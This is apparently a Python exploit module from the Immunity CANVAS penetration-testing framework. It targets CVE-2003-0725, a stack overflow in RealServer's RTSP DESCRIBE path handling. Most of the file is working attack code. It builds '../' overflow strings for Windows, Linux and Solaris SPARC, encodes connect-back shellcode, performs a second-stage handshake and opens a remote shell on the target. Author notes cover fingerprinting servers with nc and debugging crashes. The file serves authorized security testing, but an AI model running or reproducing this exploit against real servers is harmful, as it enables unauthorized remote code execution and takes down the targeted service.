#! /usr/bin/env python
"""

RealServer 8.0.2 to 9


"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

VERSION="1.0"

CHANGES="""

1.0
Found and exploited May 27, 2003 by Dave Aitel

You'll notice this bug does not have any jump addresses - after we overflow the heap,
our shellcode is called by the program itself. The only tricky bit is dealing with
the inserted 0, which we used a P6 opcode (SALC) for, which aligns up properly
and we are on our way.

As of this writing, HelixUniversal Server (which can be downloaded from Real.com for free
is at 9.0.1. You can modify the URL to get 8.0.2 as well, and a license for 9.0 will
work to enable that to run as well. Hmm. Downloading rs901-win32.exe gets you version 9.0.2.794.
Odd.

nc OPTIONS / RTSP/1.0\r\n\r\n to port 554 to get the actual version and OS of a RealServer

This exploit has been tested on:
    Server: RealServer Version 9.0.2.794 (win32) (Windows NT4 SP4, Windows XP Pro)
    Server: RealServer Version 8.0.2.471 (win32) (Windows 2000)

There's no offset or anything like that for this exploit. We overwrite executable code
on the heap which gets called for us...as our shellcode! :>

This bug was found with SPIKE 2.9 (currently unreleased)

If this exploit doesn't work, the RealServer goes down - so you get one shot. Sometimes
it restarts itself, but not in my experience.

May be some threading contention issues I haven't worked out yet. There are
a huge amount of bugs in realserver - we could spend years just exploiting each one. 
This one is nice though since you don't need an offset. :> 

This is not:
http://www.service.real.com/help/faq/security/bufferoverrun12192002.html

_________________________________________
This hole closed in version 9.0.2.881!

The content for the server is in /Content/ by default. Put a valid mp3 file in
there...it does validity checking.

Use this to strace it

strace -ff -F -etrace=file -esignal=0 -f  ./Bin/rmserver --sdm rmserver.cfg




"""


notes="""

This is hard to debug on Linux.
Try:
    Bin/rmserver --acd --sdm --sct --nca rmserver.cfg 
    Then run attack and WAIT for cores to come
    
Solaris:
    
0x00128228: __1cKServRegKey2t6MpkcpnQRegistryMemCache_c_v_(0xffbd9684, 0xf06ce028, 0xc1b39b4c, 0xffbd8520, 0xf06ce6d4, 0x2cc9ac) + 0x8c
0x00143bf0: __1cOServerRegistryF_find6MppnOServRegDB_node_ppnPServRegProperty_pkc_l_(0xef116028, 0xffbd9714, 0xffbd9710, 0xf06ce028, 0x185958, 0x5) + 0x24
0x001407d4: __1cOServerRegistryLGetPropList6MpkcrpnKIRMAValues__l_(0xef116028, 0xf06ce028, 0xffbd97e4, 0x2cc9ac, 0xf053d1f0, 0x0) + 0x14
0x001406fc: __1cOServerRegistryLGetPropList6MpkcrpnKIRMAValues_pnHProcess__l_(0xef116028, 0xf06ce028, 0xffbd97e4, 0xefe915b8, 0x2dba7c, 0x124db0) + 0x38
0xee122b80: CanUnload(0xf061bf60, 0xf06ce028, 0xf06bc028, 0x2f, 0x2e1af0, 0xee14cd78) + 0xf41c
0xee121f24: CanUnload(0xf061bf60, 0xffbd98e4, 0xffbd98ec, 0xffbd98e8, 0x0, 0xf06ce028) + 0xe7c0
0xee1215e4: CanUnload(0xf061bf60, 0xee1527b8, 0x41e420, 0x0, 0xef000004, 0xee14cd78) + 0xde80
0xee121510: CanUnload(0xf061bf60, 0xf06179c8, 0x0, 0x0, 0x1, 0x1c) + 0xddac
0x000fc6d8: __1cOMLAllowanceMgrFOnURL6MpnLIRMARequest__l_(0xf061b2b8, 0xf06179c8, 0xfc640, 0x1c00, 0x1e88, 0x2ddedc) + 0x98
0x00114190: __1cTAllowanceSerializerLCallNextOne6M_v_(0xf06556b0, 0x0, 0xffbd9a74, 0xf06556e8, 0x80040000, 0x0) + 0x44
0x0011235c: __1cGPlayerHSessionJOnURLDone6Ml_l_(0xef311270, 0x0, 0x0, 0x0, 0x2dab68, 0xff2141d8) + 0xb4
0x000c030c: __1cQAllowanceWrapperPHandleOnURLDone6Ml_v_(0xf06765a8, 0x0, 0x53851, 0x3ed75097, 0x1f6d78, 0xf0438044) + 0x1c
0x000bf538: __1cbGAllowanceWrapperResponseCallbackEfunc6MpnHProcess__v_(0xf0616e38, 0xefe915b8, 0x23b4, 0x2cc9ac, 0x197f48, 0xff2141d8) + 0x14
0x000d5bf4: __1cNDispatchQdDueueHexecute6MpnHProcess__i_(0xef050028, 0xefe915b8, 0xef051828, 0xf0616e38, 0x1060, 0x1860) + 0xec
0x0013442c: __1cMServerEngineImainloop6Mi_v_(0xef237208, 0xf0438040, 0xa9236, 0x0, 0x1c00, 0xf0439028) + 0x1254
0x000f269c: __1cLMakeProcess6FpkcpnOSimpleCallback_pnNDispatchQdDueue_ipv_pi_(0x25db5f, 0xefe91590, 0x31a64c, 0x18, 0xefe915b8, 0x60) + 0x1d0
0x000f27d0: __1cWCreateStreamerCallbackEfunc6MpnHProcess__v_(0xf0411840, 0xef04e140, 0xef252028, 0x0, 0x378, 0x2000) + 0x84
0x000f21dc: __1cUCoreTransferCallbackEfunc6MpnHProcess__v_(0xef227cc0, 0xef04e140, 0x1c00, 0x1e6c, 0x2d58e4, 0x2cc9ac) + 0xc7c
0x000d5bf4: __1cNDispatchQdDueueHexecute6MpnHProcess__i_(0xef050028, 0xef04e140, 0xef051828, 0xef227cc0, 0x1000, 0x1800) + 0xec
0x0013442c: __1cMServerEngineImainloop6Mi_v_(0x0, 0xef254040, 0x4c754, 0x0, 0x1c00, 0xef255028) + 0x1254
0x000f88f4: __1cF_main6Fippc_i_(0x0, 0x1000, 0xef227ce8, 0x3ed750be, 0xef04e140, 0x3194d8) + 0x25dc
0x000b92c4: main(0x3, 0x31cca8, 0xc, 0xffbefb9c, 0x0, 0x2cc9ac) + 0x1b0



"""



#http://www.immunityinc.com/CANVAS/
#Questions, comments: dave@immunityinc.com
#

import os,getopt
import sys


if "." not in sys.path: sys.path.append(".")


import socket
from exploitutils import *

#from shellcode.win32shell import win32shell as win32shell
from shellcode import linuxshell
import time
from tcpexploit import tcpexploit
import urllib
from sunrpc import *
import random

import httplib
import urllib

from libs.ctelnetlib import Telnet

import canvasengine

from shelllistener import shelllistener
from shelllistener import shellfromtelnet

from linuxNode import linuxNode
from win32Node import win32Node
import linuxMosdefShellServer



DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Real"
DOCUMENTATION["DATE"]="09/02/2003"
DOCUMENTATION["URLs"]=["http://www.securityfocus.com/bid/8476",
                       "http://www.kb.cert.org/vuls/id/934932",
                       "http://lists.immunityinc.com/pipermail/dailydave/2003-August/000030.html",
                       "http://www.service.real.com/help/faq/security/rootexploit082203.html",
                       "http://archives.neohapsis.com/archives/vulnwatch/2003-q3/0087.html"]
DOCUMENTATION["WARNING"]="The server will restart after a few minutes...this will cause your connection to close."
DOCUMENTATION["CVE Name"] = "CVE-2003-0725"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0725"
DOCUMENTATION['CVSS'] = 7.5



NAME="Realserver"


DESCRIPTION="RealServer ../../ stack overflow"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"], ["Linux", "i386", "_sparc"], ["Solaris", "sparc", "_i86pc"] ]



class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.setPort(554)
        self.setHost("")
        self.setVersion(1)
        self.badstring="\x00\\()/.:?\r\n%?\x20=&+ '\"#-~*<>^"
        self.name=NAME
        self.postactions+=[("mosdefmigrate", None)]
        return

    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s=self.gettcpsock()
        try:
            self.log("Testing for RealServer at %s:%d"%(self.host,self.port))
            ret=s.connect((self.host, self.port))
        except:
            ret=-1
        if ret==-1:
            self.log("Failed to connect.")
            return 0
        self.log("Connected...")
        s.sendall("OPTIONS / RTSP/1.0\r\n\r\n")
        data=self.webrecv(s)
        self.log(data)
        if data.find("win32")!=-1:
            self.log("Setting version to win32")
            self.version=1
            return 1
        if data.find("linux")!=-1:
            self.log("Setting version to Linux")
            self.version=2
            return 1
        return 0
        
    
    def createShellcode(self):
        if self.callback:
            localhost=self.callback.ip
            localport=self.callback.port
        if self.version==1:
            #need to escape this process!
            #otherwise the watchdog thread will kill us off
            #self.shellcode=self.createSmallWin32Shellcode(localhost, localport, badstring="")
            self.createWin32Shellcode("",localhost, localport)
            shellcode=self.shellcode
            #shellcode=self.createInjectToSelf(localhost,localport, injectme=self.shellcode)
            self.shellcode=self.intel_encode(self.badstring,shellcode , minimumchunklength=90)
            #shellcode=self.createWin32GOShellcode()
            #self.createSmallWin32GOShellcode()
            #shellcode=self.shellcode
            #self.createWin32ThreadCallbackShellcode()
            

            if len(self.shellcode)>1420:
                self.log("Shellcode will probably not work! Too long!")
            #self.createHeapSafeInjectIntoProcess(self.badstring, localhost, localport)
            return self.shellcode
        elif self.version==2:
            self.shellcode="" # we create this later
            #self.shellcode_stage2=self.getLinuxStage2()
        elif self.version==3:
            return self.createSparcShellcode(self.badstring,localhost,localport)
        else:
            if self.callback:
                self.localhost=localhost
                self.localport=localport
            self.log("Version not supported when creating shellcode!!!")
            return None
            
    def neededListenerTypes(self):
        self.version=self.argsDict["version"]
        if self.version==1:
            #self.listenerArgsDict["fromcreatethread"]=1
            return [canvasengine.WIN32MOSDEF]
        elif self.version==2:
            #linux reuses the shell
            return []
        elif self.version==3:
            return [canvasengine.SOLARISSPARCMOSDEF]
        else:
            #error!
            self.log("Error in neededListenerTypes of realserver exploit")
            return []
    
    def run(self):
        debug=0
        
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.socknode=self.argsDict["passednodes"][0]
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))
                
        if self.version==0:
            self.test()
            if self.version==0:
                self.log("No valid version found")
                self.setInfo("%s attacking %s:%d (failed)"%(NAME,self.host,self.port))
                return 0
            else:
                self.log("Version=%d"%self.version)
                self.createShellcode()

        if self.version==1:
            a=0
            b=369
            stuff=prettyprint(self.shellcode[a:b])
            print "Shellcode[%d : %d]=%s"%(a,b,stuff)

        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.log("Failed to connect.")
            self.setInfo("%s attacking %s:%d (could not connect)"%(NAME,self.host,self.port))
            return None
        self.log("Version=%d"%self.version)
        if self.version==2:
            self.log("Creating linux findsock code...")
            self.createLinuxGOShellcode(self.badstring)
        self.log("Shellcode length is %d"%len(self.shellcode))
        body=self.makesploit()
        s.sendall(body) #no need for ssl here, so we don't use websend
        time.sleep(0.5)
        #We don't use the GOCode for Windows as it is 
        #somewhat weirdly unreliable in realserver
        if self.version==1 and False :
            #windows
            #if you're debugging this (esp with olly)
            #then it'll take a while, so we try multiple times
            top=80
            for i in xrange(0,top):
                self.log("Checking for gocode (try %d/%d)"%((i+1),top))
                ret=self.checkTriggerGOcode(s)
                if ret:
                    self.log("Got successful Win32 gocode!")
                    newnode=self.doGOMOSDEFWin32(s)
                    return newnode
                time.sleep(0.5)
            self.log("No win32 GO trigger found! :<")
            return 0
        elif self.version==2:
            myshellcode=shellcodeGenerator.linux_X86()
            myshellcode.addAttr("setblocking",None)
            myshellcode.addAttr("read_and_exec",{"fdreg": "ebx"})
            sc=myshellcode.get()            
            try:
                self.log("Looking for GO handshake with second stage of length %d"%len(sc))
                #time.sleep(3)
                ret=linuxshell.doGOhandshake(s,secondstage=sc)
                if not ret:
                    ret=linuxshell.doGOhandshake(s,secondstage=sc)
            except:
                import traceback
                traceback.print_exc(file=sys.stdout)
                print "Setting ret to zero"
                ret=0
            if not ret:
                self.log("Could not make a shell listener - connection was closed. Exploit most likely failed.")
                self.setInfo("%s attacking %s:%d (could not make shell listener)"%(NAME,self.host,self.port))
                return None
            try:
                node=linuxNode()
                node.parentnode=self.socknode
                linuxMosdefShellServer.linuxshellserver(s,node,logfunction=self.logfunction)
                self.log("Calling startup for MOSDEF shell server")
                node.startup()
                self.setInfo("%s attacking %s:%d (Succeeded!)"%(NAME,self.host,self.port))
                return node
            except:
                import traceback
                traceback.print_exc(file=sys.stdout)
                self.log("Node startup failed. :<")
                self.log("Could not make a shell listener - connection was closed. Exploit most likely failed.")
                self.setInfo("%s attacking %s:%d (could not make shell listener)"%(NAME,self.host,self.port))
                return None
        elif self.version==1:
            time.sleep(2) #sleep 2 more seconds for connectback
            if self.ISucceeded():
                self.setProgress(100)
                self.setInfo("%s attacking %s:%d (succeeded!)"%(NAME,self.host,self.port))
                return 1

            #win32 - use GO CODE
            #ret=self.checkTriggerWin32(s)
            #if not ret:
            #    ret=self.checkTriggerWin32(s)
            #if ret:
            #    self.log("Got trigger!")
            #    import win32MosdefShellServer
            #    node=win32Node()
            #    node.parentnode=self.argsDict["passednodes"][0]
            #    newshell = win32MosdefShellServer.win32shellserver(s,node,self.logfunction)
            #    node.startup()
            #    self.setInfo("%s (Succeeded!)"%self.name)
            #    return node
            #else:
            #    self.log("No trigger for win32...failed to call GOcode?")

        else:
            data=s.recv(500)
            print "Returned: %s"%data
        self.setInfo("%s attacking %s:%d (Failed)"%(NAME,self.host,self.port))

        return None
    
   
    def makesploit(self):
        if self.version==1:
            self.log("Doing win32 version")
            return self.makesploit_win32()
        elif self.version==2:
            self.log("Doing Linux version")
            return self.makesploit_linux()
        elif self.version==3:
            self.log("Using Solaris SPARC version")
            return self.makesploit_solaris()
        else:
            self.log("This version is not supported")
            return ""

        
    def makesploit_solaris_old(self):
        #note: you sometimes have to run the exploit twice to crash solaris
        #0xfd057c77 0xfd057c77
        data=""
        data+="DESCRIBE /"
        data+="A"*(405+4)
        data+="./"*8
        data+="../"*552
        shellstring="\xff\x6f\xff\xfc"*8
        data+=urllib.quote_plus(shellstring)
        #data+="bob.smi"
        data+=" RTSP/1.0\r\n"
        #end headers
        data+="\r\n"
        return data
    
    def makesploit_solaris(self):
        #note: you sometimes have to run the exploit twice to crash solaris
        #0xfd057c77 0xfd057c77
        #at "../"*525 we hit up to i4 only so at *520 we'l'l hit up to l7
        #at that point we need to make sure we get the alignment correct
        #we use urlencode instead of urllib's quote_plus to make sure we
        #are always the exact same length...
        data=""
        data+="DESCRIBE /"
        #FIRST PHASE: A's - old stuff
        data+="A"*(405+4)
        
        #SECOND PHASE
        #to get this address just look for our string - usually %fp - 500 or so...
        #Actually: TO GET THIS ADDRESS:
        #gdb) where
        #0  0x00128834 in __1cQRegistryMemCacheRRegistryAllocator6kM_pnIMemCache__ ()
        #1  0x00143d1c in __1cOServerRegistryF_find6MppnOServRegDB_node_ppnPServRegProperty_pkc_l_ ()
        #2  0xfe855768 in ?? ()
        #3  0xfebe49c8 in ?? ()
        #Cannot access memory at address 0x2e2f2f7d
        #(gdb) x/10xw 0xfe855768-2500 (47500 is also good) +3200 is good as well
        #0xfe854da4:     0xfebe49bc      0xfebe49bc      0xfebe49bc      0xfebe49bc
        #This address is 0xfe854da4.
        #You will have to adjust this address every time you change the size of the string.
        #You may also have to fix the alignment.
        readable_addr=0xfec281b0L
        align1=1
        data+="A"*align1
        data+=urlencode(big_order(readable_addr))*5000
        data+="A"*(4-align1)
        
        #THIRD PHASE
        data+="./"*8
        data+="../"*490
        data+="ABHQABCD"
        #a valid address which points to a valid address which points to...
        #SEE:
        dang=""" You own %o0:
        0x128830 <__1cQRegistryMemCacheRRegistryAllocator6kM_pnIMemCache__>:    ld  [ %o0 ], %g4
        0x128834 <__1cQRegistryMemCacheRRegistryAllocator6kM_pnIMemCache__+4>:  ld  [ %g4 + 0x18 ], %g5
        0x128838 <__1cQRegistryMemCacheRRegistryAllocator6kM_pnIMemCache__+8>:  ld  [ %g5 ], %o1
        0x12883c <__1cQRegistryMemCacheRRegistryAllocator6kM_pnIMemCache__+12>: retl 
        0x128840 <__1cQRegistryMemCacheRRegistryAllocator6kM_pnIMemCache__+16>: ld  [ %o1 + 0x38 ], %o0
         (note: o1 + 0x38 must work and IS excuted before the retl)

        """
        addrstring=urlencode(big_order(readable_addr))
        data+=("A%s.//"%addrstring)*100
        #room for shellcode
        shellstring="AAAA"*499
        #room for fake addresses
        align2=2
        #0x143d28 <__1cOServerRegistryF_find6MppnOServRegDB_node_ppnPServRegProperty_pkc_l_+348>:        ld  [ %i0 ], %l7
        #if i0 isn't aligned, set align2
        shellstring+="A"
        shellstring+=big_order(readable_addr)*(0x2060)
        shellstring+="AAA"
        data+=urlencode(shellstring)
        #data+="bob.smi"
        data+=" RTSP/1.0\r\n"
        #end headers
        data+="\r\n"
        return data
    
    def makesploit_linux(self):
        data=""
        data+="DESCRIBE /"
        data+="../"*520
        #for debugging
        #data+="%cc"*50
        #there is a 0 placed here, so this instruction actually becomes 
        #00 d6 d6 which is add dh,dl, then the rest become SALC which is a nop as far as we are concerned
        data+="%d6"*50
        #if debug
        #data+="%cc"
        data+=urllib.quote_plus(self.shellcode)
        #data+=urllib.quote_plus("\xeb\xfe")
        data+="bob.smi"
        data+=" RTSP/1.0\r\n"
        #end headers
        data+="\r\n"
        return data
        
    #returns the sploitstring
    def makesploit_win32(self):
        data=""
        data+="DESCRIBE /./"
        data+="../"*1200
        #for debugging
        #data+="%cc"*50
        #there is a 0 placed here, so this instruction actually becomes 
        #00 d6 d6 which is add dh,dl, then the rest become SALC which is a nop as far as we are concerned
        data+="%d6"*50
        #if debug
        #data+="%cc"
        data+=urllib.quote_plus(self.shellcode)
        data+="bob.smi"
        data+=" RTSP/1.0\r\n"
        #end headers
        data+="\r\n"
        return data

    def displayVersions(self):
        print "Versions: "
        print "\t1 - RealServer Version 8.0.2.471-9.0.2.794 (win32)"
        print "\t2 - RealServer Version 9.0.2.471 (Linux)"
        print "\t3 - RealServer Version 9.0.2.471 (Solaris Sparc 2.8)"
        return

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()

